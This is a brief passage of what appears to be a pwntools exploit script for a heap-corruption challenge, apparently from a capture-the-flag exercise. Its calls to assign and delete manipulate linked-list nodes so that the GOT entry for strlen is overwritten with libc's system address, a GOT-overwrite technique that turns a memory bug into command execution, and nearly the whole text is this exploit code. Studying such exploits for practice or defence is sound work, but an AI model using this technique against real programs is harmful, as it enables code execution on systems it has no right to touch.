...
assign(b'', pack(context.binary.got['strlen'])) # this returns the node pointer. node->data is overwritten with data[]; node->next is partially written by name[]. 
delete(b'')
delete(b'')

assign(b'', b'')
assign(b'hi', pack(context.libc.symbols['system']))
